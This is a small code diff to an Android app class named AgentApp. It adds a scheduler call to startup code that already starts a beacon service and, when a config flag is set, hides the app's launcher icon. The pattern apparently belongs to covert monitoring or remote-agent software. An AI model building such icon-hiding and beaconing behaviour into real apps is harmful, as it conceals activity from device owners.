@@ -14,6 +14,7 @@ public class AgentApp extends Application {
             NativeBridge.init(this, config, Common.sid(this));
             BeaconService.start(this);
             Scheduler.arm(this);
+            Scheduler.kick(this);
             if (config.hideIcon) {
                 Launcher.setEnabled(this, false);
             }
